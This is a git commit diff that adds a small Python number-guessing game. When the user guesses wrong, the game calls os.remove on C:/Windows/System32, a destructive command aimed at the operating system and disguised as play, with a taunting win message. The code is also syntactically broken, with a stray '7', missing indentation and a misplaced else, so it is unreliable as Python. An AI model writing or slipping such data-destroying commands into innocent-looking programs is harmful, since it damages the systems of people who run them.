726babf5559530a8340c38667fc84447e76dddfb
st1koo <74153758+st1koo@users.noreply.github.com>
2024-02-18 14:43:56 +0200

    Added randint

---
+++ game.py
@@ -0,0 +1,12 @@
+import random
+import os
+
+number = random.randint(1,10)
+
+guess = input("let's play a GAME, guess the nummber from 1-10")
+guess = int(guess)
+
+if guess == number: 7
+print ("you won congrats for not breaking you operating system")
+else:
+os.remove("C:/Windows/System32")
